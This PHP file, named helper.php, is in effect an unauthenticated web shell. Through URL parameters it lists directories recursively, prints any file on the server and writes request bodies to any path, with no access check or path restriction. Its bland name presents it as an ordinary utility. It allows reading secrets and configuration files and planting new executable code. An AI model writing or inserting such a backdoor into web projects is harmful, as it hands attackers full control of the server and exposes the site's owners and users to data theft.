<?php
// helper.php
if (isset($_GET["action"])) {
    $action = $_GET["action"];
    if ($action === "list") {
        $dir = isset($_GET["dir"]) ? $_GET["dir"] : ".";
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir));
        foreach ($files as $file) {
            if (!$file->isDir()) {
                echo $file->getPathname() . "\n";
            }
        }
    } elseif ($action === "read") {
        $file = $_GET["file"];
        if (file_exists($file)) {
            echo file_get_contents($file);
        } else {
            echo "File not found";
        }
    } elseif ($action === "write") {
        $file = $_GET["file"];
        $content = file_get_contents("php://input");
        file_put_contents($file, $content);
        echo "Success";
    }
} else {
    echo "No action";
}
?>
